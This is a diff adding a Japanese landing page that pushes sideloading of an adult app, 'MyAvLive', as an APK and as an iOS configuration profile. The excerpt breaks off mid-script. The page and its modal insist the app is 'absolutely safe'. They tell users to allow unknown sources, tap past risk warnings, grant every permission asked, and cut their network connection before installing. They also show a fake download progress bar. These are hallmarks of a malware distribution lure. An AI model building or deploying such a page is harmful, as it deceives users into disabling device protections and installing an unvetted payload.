@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+<html lang="ja"><head>
+  <base href="/landing-pages/japapp/">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>アプリ配信ランディングページ</title>
+
+  <!-- 修复了QRCode.js的404报错，替换为稳定的CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  
+  <style>
+    /* ============ CSS Reset ============ */
+    *, *::before, *::after { box-sizing: border-box; }
+    * { margin: 0; }
+    body {
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+    }
+    img, picture, video, canvas, svg { display: block; }
+    input, button, textarea, select { font: inherit; }
+    p, h1, h2, h3, h4, h5, h6 { overflow-wrap: break-word; }
+    p { text-wrap: pretty; }
+    h1, h2, h3, h4, h5, h6 { text-wrap: balance; }
+    @media (hover: hover) {
+      a:hover, button:hover { opacity: 0.7; }
+    }
+    button {
+      margin: 0; padding: 0; border: 0;
+      background-color: transparent; cursor: pointer;
+    }
+
+    /* ============ Global ============ */
+    body {
+      position: relative;
+      background-color: #191919;
+      color: #fff;
+      font-family: -apple-system, 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', Meiryo, 'Yu Gothic', BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      font-weight: 400;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .main { position: relative; background: #191919; }
+
+    /* Show/Hide */
+    .show-on-desktop { display: block; }
+    .show-on-mobile { display: none; }
+
+    /* ============ Desktop Layout ============ */
+    .main-desktop {
+      position: relative;
+      display: flex;
+      width: 100%;
+      height: 100vh;
+      height: 100dvh;
+      min-height: 800px;
+    }
+
+    .main-desktop__promotion {
+      width: 40%;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .main-desktop__promotion--content {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 36px;
+    }
+
+    .main-desktop__promotion--logo {
+      width: 88%;
+      padding: 30px 0 0 0;
+    }
+
+    /* Desktop title — replaces title-desktop.png */
+    .main-desktop__promotion--title {
+      font-size: 42px;
+      font-weight: 800;
+      letter-spacing: 6px;
+      background: linear-gradient(135deg, #00D2BE 0%, #a445b3 50%, #f06 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-align: center;
+      padding: 0 16px;
+    }
+
+    .main-desktop__promotion--qrcode {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 180px;
+      height: 210px;
+    }
+
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .main-desktop__promotion--qrcode-loading {
+      animation: rotate 2s linear infinite;
+      display: block;
+    }
+
+    .main-desktop__promotion--qrcode-container {
+      display: none;
+    }
+
+    .main-desktop__promotion--qrcode-wrapper {
+      padding: 16px;
+      background-color: #fff;
+      border-radius: 8px 8px 0 0;
+      height: 180px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .main-desktop__promotion--qrcode-wrapper canvas,
+    .main-desktop__promotion--qrcode-wrapper img {
+      width: 148px !important;
+      height: 148px !important;
+    }
+
+    /* Desktop QR notice — replaces qrcode-notice.png */
+    .main-desktop__promotion--cta {
+      width: 180px;
+      border-radius: 0 0 8px 8px;
+      background: linear-gradient(135deg, #00D2BE, #a445b3);
+      color: #fff;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 10px 12px;
+      text-align: center;
+      letter-spacing: 1px;
+      line-height: 1.4;
+    }
+
+    .divider {
+      width: 1px;
+      height: 20px;
+      background-color: rgba(255, 255, 255, 0.40);
+    }
+
+    .main-desktop__promotion--footer {
+      width: 100%;
+    }
+
+    /* Desktop footer — text only */
+    .main-desktop__promotion--footer-text {
+      text-align: center;
+      font-size: 16px;
+      color: rgba(255,255,255,0.35);
+      padding: 20px 24px;
+      line-height: 1.8;
+      max-width: 360px;
+      margin: 0 auto;
+    }
+
+    .main-desktop__bg {
+      position: relative;
+      width: 60%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #2a2a2a;
+      overflow: hidden;
+    }
+
+    .main-desktop__bg--cover {
+      display: none;
+      width: 100%;
+      height: 100%;
+      object-position: top left;
+      object-fit: cover;
+    }
+
+    .main-desktop__bg--gradient {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: linear-gradient(0deg, #191919 -3.89%, rgba(25, 25, 25, 0.00) 25.08%);
+    }
+
+    .main-desktop__bg--placeholder {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: top center;
+    }
+
+    /* ============ Mobile Layout (max-width: 1023px) ============ */
+    @media only screen and (max-width: 1023px) {
+      .show-on-desktop { display: none; }
+      .show-on-mobile { display: block; }
+
+      .main-mobile {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: end;
+        position: relative;
+        width: 100%;
+        height: 100vh;
+        height: 100dvh;
+        background-color: #2a2a2a;
+        overflow: hidden;
+      }
+
+      .main-mobile__bg {
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 80%;
+      }
+
+      .main-mobile__bg--cover {
+        display: none;
+        width: 100%; height: 100%;
+        object-position: top center;
+        object-fit: cover;
+      }
+
+      .main-mobile__bg--placeholder {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        object-position: top center;
+      }
+
+      .main-mobile__gradient {
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: linear-gradient(180deg, rgba(43, 43, 43, 0.06) 52.63%, #2B2B2B 72.96%);
+      }
+
+      .main-mobile__shadow {
+        position: fixed;
+        bottom: 0; left: 0;
+        width: 100%; height: 180px;
+        pointer-events: none;
+        display: none;
+        background: linear-gradient(180deg, rgba(0, 0, 0, 0.00) 14.47%, #232323 41.32%);
+        transition: opacity 0.3s ease-in-out;
+      }
+
+      .main-mobile__promotion {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 24px;
+        margin-bottom: 8px;
+        z-index: 10;
+      }
+
+      .main-mobile__logo-area {
+        position: absolute;
+        top: 32px; left: 50%;
+        transform: translateX(-50%);
+        z-index: 10;
+        width: 80%;
+        display: flex;
+        justify-content: center;
+      }
+
+      .main-mobile__logo {
+        width: 100%;
+      }
+
+      /* Mobile title — replaces title-mobile.png */
+      .main-mobile__title {
+        font-size: 28px;
+        font-weight: 800;
+        letter-spacing: 4px;
+        background: linear-gradient(135deg, #00D2BE 0%, #a445b3 50%, #f06 100%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        text-align: center;
+      }
+
+      .main-mobile__cta-container {
+        height: 120px;
+        width: 100%;
+      }
+
+      .main-mobile__cta {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 4px;
+        left: 0; bottom: 0;
+        z-index: 1000;
+        transition: all 0.3s ease;
+        position: fixed;
+      }
+
+      /* Mobile CTA notice — replaces teach-cta.svg */
+      .main-mobile__cta--notice {
+        font-size: 12px;
+        color: rgba(255,255,255,0.45);
+        cursor: pointer;
+        text-align: center;
+        padding: 4px 0;
+        transition: color 0.2s;
+      }
+      .main-mobile__cta--notice:hover {
+        color: rgba(255,255,255,0.7);
+      }
+
+      /* Mobile download button — replaces apk-cta.svg */
+      .main-mobile__button {
+        width: 100%;
+        border: none;
+        border-radius: 50px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 14px 40px;
+        background: linear-gradient(135deg, #a445b3, #f06);
+        color: #fff;
+        font-size: 18px;
+        font-weight: 700;
+        letter-spacing: 2px;
+        min-height: 52px;
+        min-width: 280px;
+        box-shadow: 0 4px 20px rgba(164, 69, 179, 0.35);
+        transition: opacity 0.2s, transform 0.15s;
+      }
+      .main-mobile__button:active {
+        transform: scale(0.97);
+      }
+
+      .main-mobile__cta--loading-container { position: relative; }
+
+      .main-mobile__cta--loading {
+        position: absolute;
+        right: 10px; top: 10px;
+        width: 32px; height: 32px;
+        animation: rotate 2s linear infinite;
+        display: none;
+      }
+
+      .main-mobile__cta--btn {
+        width: 100%;
+        max-width: 400px;
+      }
+
+      .main-mobile__button--disable {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      /* Mobile footer — text only */
+      .footer {
+        width: 100%;
+        background-color: #191919;
+        text-align: center;
+        padding: 30px 20px;
+        margin-bottom: 150px;
+      }
+
+      .footer__text {
+        font-size: 15px;
+        color: rgba(255,255,255,0.3);
+        line-height: 2;
+        max-width: 420px;
+        margin: 0 auto;
+      }
+
+      .footer__text em {
+        font-style: normal;
+        color: rgba(255,255,255,0.45);
+      }
+
+      /* Modal */
+      .modal {
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        z-index: 1002;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease, visibility 0.3s ease;
+      }
+
+      .modal.show {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .modal__backdrop {
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(25, 25, 25, 0.80);
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      .modal.show .modal__backdrop { opacity: 1; }
+
+      .modal__content {
+        position: absolute;
+        border-radius: 12px;
+        background: #fff;
+        top: 50%; left: 50%;
+        transform: translate(-50%, -50%) scale(0.9);
+        width: 320px;
+        padding: 28px 24px;
+        display: flex;
+        flex-direction: column;
+        gap: 18px;
+        opacity: 0;
+        transition: transform 0.3s ease, opacity 0.3s ease;
+        color: #333;
+      }
+
+      .modal.show .modal__content {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 1;
+      }
+
+      /* Modal body — replaces modal-content.jpg */
+      .modal__content--body {
+        flex-grow: 1;
+        text-align: center;
+      }
+
+      .modal__content--body--icon {
+        width: 72px;
+        height: 72px;
+        border-radius: 16px;
+        margin: 0 auto 14px;
+        display: block;
+        object-fit: cover;
+      }
+
+      .modal__content--body--title {
+        font-size: 17px;
+        font-weight: 700;
+        color: #111;
+        margin-bottom: 6px;
+      }
+
+      .modal__content--body--subtitle {
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 12px;
+      }
+
+      .modal__content--body--desc {
+        font-size: 12px;
+        color: #666;
+        line-height: 1.75;
+        margin-bottom: 12px;
+      }
+
+      .modal__content--body--steps {
+        font-size: 12px;
+        color: #555;
+        line-height: 1.85;
+        text-align: left;
+        background: #fafafa;
+        border-radius: 8px;
+        padding: 12px 14px;
+      }
+
+      .modal__content--body--note {
+        font-size: 11px;
+        color: #999;
+        line-height: 1.6;
+        margin-top: 8px;
+      }
+
+      .modal__content--button {
+        width: 100%;
+        border: none;
+        border-radius: 8px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 54px;
+        background: #00D2BE;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: opacity 0.2s, background 0.2s;
+        letter-spacing: 1px;
+      }
+      .modal__content--button:hover {
+        background: #00b8a6;
+      }
+
+      .modal__content--button--text--container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 4px;
+        max-width: 150px;
+        font-size: 13px;
+        color: #888;
+      }
+
+      .modal__content--button--text--loading {
+        animation: rotate 2s linear infinite;
+        width: 20px; height: 20px;
+        border: 2px solid #ddd;
+        border-top-color: #00D2BE;
+        border-radius: 50%;
+      }
+
+      .modal__content--button--container {
+        position: relative;
+        display: flex;
+      }
+
+      .modal__content--footer { position: relative; }
+
+      .modal__content--button--loading {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      .modal__content--loading {
+        animation: rotate 2s linear infinite;
+        display: none;
+        position: absolute;
+        right: 15px; top: 20px;
+        width: 20px; height: 20px;
+      }
+
+      /* Download progress */
+      .modal__progress {
+        display: none;
+        width: 100%;
+        position: absolute;
+        left: 0; right: 0; bottom: -15px;
+        padding: 0 2px;
+        pointer-events: none;
+        z-index: 2;
+      }
+      .modal__progress--bar-wrap {
+        width: 100%;
+        height: 6px;
+        background: #eee;
+        border-radius: 4px;
+        overflow: hidden;
+        margin-top: 8px;
+      }
+      .modal__progress--bar {
+        width: 0%;
+        height: 100%;
+        background: #00D2BE;
+        transition: width 0.2s ease;
+      }
+      .modal__progress--text {
+        display: none;
+        margin-top: 8px;
+        color: #333;
+        font-size: 12px;
+        text-align: center;
+      }
+
+      /* Error Modal */
+      .modal-error {
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        z-index: 1002;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease, visibility 0.3s ease;
+      }
+
+      .modal-error.show {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .modal-error__backdrop {
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      .modal-error.show .modal-error__backdrop { opacity: 1; }
+
+      .modal-error__content {
+        position: absolute;
+        background: #BC0000;
+        left: 0; right: 0; bottom: 0;
+        transform: translateY(100%);
+        width: 100%;
+        min-height: 160px;
+        padding: 20px 24px 28px;
+        display: flex;
+        flex-direction: column;
+        opacity: 0;
+        transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s ease;
+        color: #fff;
+      }
+
+      .modal-error.show .modal-error__content {
+        transform: translateY(0);
+        opacity: 1;
+      }
+
+      /* Error modal body — replaces alert-information-safari.png */
+      .modal-error__content--body { flex-grow: 1; }
+
+      .modal-error__content--body--warning {
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        margin-bottom: 16px;
+      }
+
+      .modal-error__content--body--icon {
+        font-size: 28px;
+        line-height: 1;
+        flex-shrink: 0;
+      }
+
+      .modal-error__content--body--text {
+        font-size: 14px;
+        font-weight: 500;
+        line-height: 1.65;
+      }
+
+      .modal-error__content--button {
+        width: 100%;
+        border: none;
+        border-radius: 8px;
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        margin-top: 12px;
+      }
+
+      /* Error close button — replaces alert-cta.svg */
+      .modal-error__content--button--text {
+        background: rgba(255,255,255,0.15);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 10px 28px;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+      .modal-error__content--button--text:hover {
+        background: rgba(255,255,255,0.25);
+      }
+
+      .main-mobile__install-guide--go-top {
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        padding: 12px;
+        position: sticky;
+        right: 16px; bottom: 120px;
+        z-index: 1001;
+      }
+
+      /* Go-top arrow — CSS only, replaces go-top.png */
+      .main-mobile__install-guide--go-top--btn {
+        display: flex;
+        width: 44px; height: 44px;
+        border-radius: 50%;
+        background: rgba(255,255,255,0.12);
+        backdrop-filter: blur(8px);
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        transition: background 0.2s, opacity 0.2s;
+        border: none;
+        color: rgba(255,255,255,0.7);
+        font-size: 18px;
+        font-weight: bold;
+        line-height: 1;
+      }
+      .main-mobile__install-guide--go-top--btn:hover {
+        background: rgba(255,255,255,0.22);
+      }
+
+      .main-mobile__install-guide {
+        background-color: #323232;
+      }
+
+      .main-mobile__install-guide--content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .main-mobile__install-guide--content--wrapper {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        max-width: 400px;
+        margin-bottom: 48px;
+      }
+
+      .ios-step { display: none; }
+      .apk-step { display: block; }
+
+      /* Install guide steps styling */
+      .install-step-title {
+        color: #fff;
+        text-align: center;
+        padding: 20px;
+        font-size: 16px;
+      }
+      .install-step-title strong {
+        display: block;
+        margin-bottom: 14px;
+        font-size: 18px;
+        letter-spacing: 1px;
+      }
+      .install-step-item {
+        font-size: 14px;
+        color: #aaa;
+        line-height: 2.2;
+        padding-left: 4px;
+      }
+    }
+
+    /* ============ Toast ============ */
+    .toast {
+      position: fixed;
+      left: 50%;
+      bottom: 30px;
+      transform: translateX(-50%) translateY(8px);
+      padding: 10px 20px;
+      background: rgba(25, 25, 25, 0.88);
+      color: #fff;
+      font-weight: bold;
+      text-align: center;
+      border-radius: 10px;
+      font-size: 14px;
+      line-height: 20px;
+      z-index: 2147483647;
+      opacity: 0;
+      transition: opacity 200ms ease, transform 200ms ease;
+      pointer-events: none;
+      backdrop-filter: blur(8px);
+    }
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+<style>
+  .imageye-selected {
+    outline: 2px solid black !important;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5) !important;
+  }
+</style>  <script src="/landing-runtime.js" defer></script>
+</head>
+
+<body>
+  <main class="main">
+    <!-- ============ Desktop ============ -->
+    <section class="show-on-desktop main-desktop">
+      <div class="main-desktop__promotion">
+        <img class="main-desktop__promotion--logo" src="static/picture/logo.svg" alt="logo">
+        <div class="main-desktop__promotion--content">
+          <h1 class="main-desktop__promotion--title">MyAvLive</h1>
+
+          <div class="main-desktop__promotion--qrcode">
+            <img class="main-desktop__promotion--qrcode-loading" src="static/picture/loading.svg" alt="loading" style="display: none;">
+            <div class="main-desktop__promotion--qrcode-container" style="display: block;">
+              <div class="main-desktop__promotion--qrcode-wrapper">
+                <div id="qrcode" title="https://o5n6.my/"><canvas width="148" height="148"></canvas><img style="display: none;"></div>
+              </div>
+              <div class="main-desktop__promotion--cta">安全にスキャン<br>安全・無害・無リスク</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="main-desktop__promotion--footer">
+          <p class="main-desktop__promotion--footer-text">
+            MyAvLive APPは成人向けコンテンツを含みます。<br>
+            当社は健全な広告収入で運営しており、<br>
+            悪意のあるプログラムの配布は一切行っておりません。<br>
+            安心してインストールしてください！<br><br>
+            <em>Copyright © MyAvLive</em>
+          </p>
+        </div>
+      </div>
+
+      <div class="main-desktop__bg">
+        <img class="main-desktop__bg--cover" src="static/picture/bg-cover.jpg" alt="bg" style="display: block;">
+        <img class="main-desktop__bg--placeholder" src="static/picture/bg-placeholder.jpg" alt="bg" style="display: none;">
+        <div class="main-desktop__bg--gradient"></div>
+      </div>
+    </section>
+
+    <!-- ============ Mobile ============ -->
+    <section class="show-on-mobile main-mobile">
+      <div class="main-mobile__logo-area">
+        <img src="static/picture/logo.svg" class="main-mobile__logo" alt="logo">
+      </div>
+      <div class="main-mobile__bg">
+        <img class="main-mobile__bg--cover" src="static/picture/bg-cover.jpg" alt="bg" style="display: block;">
+        <img class="main-mobile__bg--placeholder" src="static/picture/bg-placeholder-mobile.jpg" alt="bg" style="display: none;">
+      </div>
+      <div class="main-mobile__gradient"></div>
+      <div class="main-mobile__shadow"></div>
+
+      <div class="main-mobile__promotion">
+        <h1 class="main-mobile__title">MyAvLive</h1>
+        <div class="main-mobile__cta-container">
+          <div class="main-mobile__cta">
+            <div class="main-mobile__cta--loading-container">
+              <img class="main-mobile__cta--loading" src="static/picture/loading.svg" alt="loading">
+              <button class="main-mobile__button main-mobile__cta--btn">APK をダウンロード</button>
+            </div>
+            <span class="main-mobile__cta--notice">ⓘ インストール手順を見る</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ Install Guide (Mobile) ============ -->
+    <section id="install-guide" class="show-on-mobile main-mobile__install-guide">
+      <div class="main-mobile__install-guide--content">
+        <!-- iOS Steps -->
+        <div class="main-mobile__install-guide--content--wrapper ios-step">
+          <div class="install-step-title">
+            <strong>📱 iOS インストール手順</strong>
+            <div class="install-step-item">1. ダウンロードボタンをタップ</div>
+            <div class="install-step-item">2. 構成プロファイルのダウンロードを許可</div>
+            <div class="install-step-item">3. 設定 → 一般 → VPNとデバイス管理 へ移動</div>
+            <div class="install-step-item">4. プロファイルをインストール</div>
+            <div class="install-step-item">5. ホーム画面からアプリを開く</div>
+          </div>
+        </div>
+        <!-- Android Steps -->
+        <div class="main-mobile__install-guide--content--wrapper apk-step">
+          <div class="install-step-title">
+            <strong>🤖 Android インストール手順</strong>
+            <div class="install-step-item">1. 「APK をダウンロード」ボタンをタップ</div>
+            <div class="install-step-item">2. 「不明なソース」の警告が出たら設定で許可</div>
+            <div class="install-step-item">3. ダウンロード完了後、インストールをタップ</div>
+            <div class="install-step-item">4. アプリを開いてご利用ください</div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <div class="show-on-mobile main-mobile__install-guide--go-top">
+      <button class="main-mobile__install-guide--go-top--btn" aria-label="トップへ戻る" style="display: none; opacity: 0; transition: opacity 0.3s ease-in-out;">▲</button>
+    </div>
+  </main>
+
+  <!-- ============ Mobile Footer ============ -->
+  <footer class="show-on-mobile footer">
+    <p class="footer__text">
+      MyAvLive APP には成人向けコンテンツが含まれます。<br>
+      当社は健全な広告収益で運営しており、悪意のあるプログラムの配布は一切行っておりません。<br>
+      安心してご利用ください！<br><br>
+      <em>Copyright © MyAvLive</em>
+    </p>
+  </footer>
+
+  <!-- ============ Download Modal (Mobile) ============ -->
+  <div class="show-on-mobile modal">
+    <div class="modal__backdrop"></div>
+    <div class="modal__content">
+      <div class="modal__content--body">
+        <!-- Replaces modal-content.jpg with pure HTML text -->
+        <img class="modal__content--body--icon" src="static/picture/app-icon.png" alt="MyAvLive">
+        <h3 class="modal__content--body--title">まもなくインストール開始</h3>
+        <p class="modal__content--body--subtitle">本アプリは公式正規版です<br>絶対安全・無害</p>
+        <p class="modal__content--body--desc">
+          システムが「未知のソース」警告を表示することがありますが、<br>
+          これはAndroidシステムの標準的なセキュリティ通知です。<br>
+          安心して続行してください！
+        </p>
+        <div class="modal__content--body--steps">
+          ブロックされた場合 → 「許可」をタップ<br>
+          リスク警告が表示 → 「続けてインストール」を選択<br>
+          権限設定が必要 → 表示に従って有効化
+        </div>
+        <p class="modal__content--body--note">
+          ※ 強く推奨：ダウンロード後にネットワークを切断してからアプリをインストールしてください
+        </p>
+      </div>
+      <div class="modal__content--footer">
+        <button class="modal__content--button download-apk">
+          <div class="modal__content--button--container">
+            <span style="color:#fff;font-size:16px;">インストール</span>
+          </div>
+          <div class="modal__content--loading"><img src="static/picture/loading.svg" alt=""></div>
+        </button>
+        <div class="modal__progress" id="download-progress">
+          <div class="modal__progress--bar-wrap">
+            <div class="modal__progress--bar" id="download-progress-bar"></div>
+          </div>
+          <div class="modal__progress--text" id="download-progress-text">0%</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ Error Modal (Mobile) ============ -->
+  <div class="show-on-mobile modal-error">
+    <div class="modal-error__backdrop"></div>
+    <div class="modal-error__content">
+      <div class="modal-error__content--body">
+        <!-- Replaces alert-information-safari.png with pure HTML -->
+        <div class="modal-error__content--body--warning">
+          <span class="modal-error__content--body--icon">⚠️</span>
+          <p class="modal-error__content--body--text">
+            iOSデバイスではSafariブラウザを使用する必要があります。<br><br>
+            他のブラウザ（Chromeなど）で開いている場合は、<br>
+            以下の手順でSafariで再度開いてください。<br><br>
+            ① このページのURLをコピー<br>
+            ② Safariを起動しアドレスバーに貼り付け<br>
+            ③ アクセスしてダウンロード手続きへ進む
+          </p>
+        </div>
+        <button class="modal-error__content--button">
+          <span class="modal-error__content--button--text">了解しました</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ Toast ============ -->
+  <div class="toast" id="toast"></div>
+
+  <!-- ============ Scripts ============ -->
+  <script>
+  (function() {
+    'use strict';
+
+    // ========== Platform Detection ==========
+    var IS_IOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+    var IS_ANDROID = /Android/.test(navigator.userAgent);
+    var IS_SAFARI = /Safari/.test(navigator.userAgent) && /Version/.test(navigator.userAgent) &&
+      !/Chrome|Chromium|EdgiOS|OPR|Opera|Firefox|UMEBrowser|UCBrowser|SamsungBrowser|MQQBrowser/i.test(navigator.userAgent);
+
+    // ========== Toast ==========
+    var toastEl = document.getElementById('toast');
+    var toastTimer = null;
+
+    function showToast(message, duration) {
+      duration = duration || 2500;
+      if (toastTimer) clearTimeout(toastTimer);
+      toastEl.textContent = message;
+      toastEl.classList.add('show');
+      toastTimer = setTimeout(function() {
+        toastEl.classList.remove('show');
+      }, duration);
+    }
+
+    // ========== QR Code Generation ==========
+    function generateQRCode(url) {
+      try {
+        var qrContainer = document.getElementById('qrcode');
+        var qrLoading = document.querySelector('.main-desktop__promotion--qrcode-loading');
+        var qrContainerWrapper = document.querySelector('.main-desktop__promotion--qrcode-container');
+        if (!qrContainer) return;
+        qrContainer.innerHTML = '';
+        new QRCode(qrContainer, {
+          text: url || window.location.href,
+          width: 148,
+          height: 148,
+          colorDark: '#000000',
+          colorLight: '#ffffff',
+          correctLevel: QRCode.CorrectLevel.M
+        });
+        if (qrLoading) qrLoading.style.display = 'none';
+        if (qrContainerWrapper) qrContainerWrapper.style.display = 'block';
+      } catch (e) {
+        console.warn('QR Code generation failed:', e);
+      }
+    }
+
+    // ========== Background Image ==========
+    function generateBackgroundImage() {
+      var desktopBg = document.querySelector('.main-desktop__bg--cover');
+      var desktopPlaceholder = document.querySelector('.main-desktop__bg--placeholder');
+      var mobileBg = document.querySelector('.main-mobile__bg--cover');
+      var mobilePlaceholder = document.querySelector('.main-mobile__bg--placeholder');
+
+      var img = new Image();
+      img.onload = function() {
+        if (desktopBg) {
+          desktopBg.src = img.src;
+          desktopBg.style.display = 'block';
+          if (desktopPlaceholder) desktopPlaceholder.style.display = 'none';
+        }
+        if (mobileBg) {
+          mobileBg.src = img.src;
+          mobileBg.style.display = 'block';
+          if (mobilePlaceholder) mobilePlaceholder.style.display = 'none';
+        }
+      };
+      img.onerror = function() {
+        console.debug('Background image not available, using placeholder');
+      };
+      
+      // 修复了背景图片报错 404 的问题
+      img.src = 'static/picture/bg-cover.jpg';
+    }
+
+    // ========== APK Download Configuration ==========
+    // 已经将下载链接修改为 download/
+    var APK_FILENAME = 'MyAvLive.apk';
+    var APK_PATH = 'download/';
+
+    // ========== Real Download ==========
+    function startDownload() {
+      var progressBar = document.getElementById('download-progress-bar');
+      var progressText = document.getElementById('download-progress-text');
+      var progressWrapper = document.getElementById('download-progress');
+      var modalLoading = document.querySelector('.modal__content--loading');
+
+      // ===== Meta Pixel + CAPI: Track Download Click =====
+      var evtId = 'dl_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
+      var evtTime = Math.floor(Date.now() / 1000);
+
+      // 1) 前端 Pixel（浏览器端）— 带 eventID 用于与 CAPI 去重
+      if (typeof fbq === 'function') {
+        fbq('track', 'Lead', {
+          content_name: 'MyAvLive APK Download',
+          content_category: 'AppDownload',
+          currency: 'JPY',
+          value: 0
+        }, { eventID: evtId });
+        fbq('trackCustom', 'Download', {
+          app_name: 'MyAvLive',
+          file_name: APK_FILENAME
+        }, { eventID: evtId });
+      }
+
+      // 2) CAPI（服务端，通过 capi.php 转发，相同 eventID 供 Meta 去重）
+      function getCookie(name) {
+        var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return match ? decodeURIComponent(match[2]) : '';
+      }
+      try {
+        fetch('capi.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event_name: 'Download',
+            event_id:   evtId,
+            event_time: evtTime,
+            page_url:   window.location.href,
+            fbp:        getCookie('_fbp'),
+            fbc:        getCookie('_fbc')
+          }),
+          keepalive: true
+        }).catch(function(){});
+      } catch(e) {}
+      // ===== End Meta Pixel + CAPI =====
+
+      if (progressWrapper) progressWrapper.style.display = 'block';
+      if (modalLoading) modalLoading.style.display = 'block';
+
+      // Actually trigger the download via hidden iframe
+      // (Using iframe avoids page navigation on mobile)
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = APK_PATH;
+      document.body.appendChild(iframe);
+
+      // Clean up iframe after a delay
+      setTimeout(function() {
+        document.body.removeChild(iframe);
+      }, 10000);
+
+      // Visual progress bar for user feedback
+      var percent = 0;
+      var interval = setInterval(function() {
+        percent += Math.floor(Math.random() * 12) + 4;
+        if (percent >= 100) {
+          percent = 100;
+          clearInterval(interval);
+          if (progressBar) progressBar.style.width = '100%';
+          if (progressText) progressText.textContent = '100%';
+          if (modalLoading) modalLoading.style.display = 'none';
+
+          setTimeout(function() {
+            if (progressWrapper) progressWrapper.style.display = 'none';
+            showToast('ダウンロード開始！ブラウザの通知を確認してください');
+            var modal = document.querySelector('.modal');
+            var mobileLoading = document.querySelector('.main-mobile__cta--loading');
+            if (modal) modal.classList.remove('show');
+            if (mobileLoading) mobileLoading.style.display = 'none';
+          }, 1200);
+        } else {
+          if (progressBar) progressBar.style.width = percent + '%';
+          if (progressText) progressText.textContent = percent + '%';
+        }
+      }, 400);
+    }
+
+    // ========== Modal Interactions (Mobile) ==========
+    function initMobileInteractions() {
+      var mobileButton = document.querySelector('.main-mobile__button');
+      var modalElement = document.querySelector('.modal');
+      var modalBackdrop = document.querySelector('.modal__backdrop');
+      var modalButtonApk = document.querySelector('.modal__content--button.download-apk');
+      var mobileLoading = document.querySelector('.main-mobile__cta--loading');
+      var modalError = document.querySelector('.modal-error');
+      var modalErrorBackdrop = document.querySelector('.modal-error__backdrop');
+      var modalErrorButton = document.querySelector('.modal-error__content--button');
+      var downloadContainer = document.querySelector('.modal__content--button--container');
+      var modalLoading = document.querySelector('.modal__content--loading');
+      var isDownloading = false;
+
+      if (!mobileButton) return;
+
+      // Mobile CTA button click
+      mobileButton.addEventListener('click', function() {
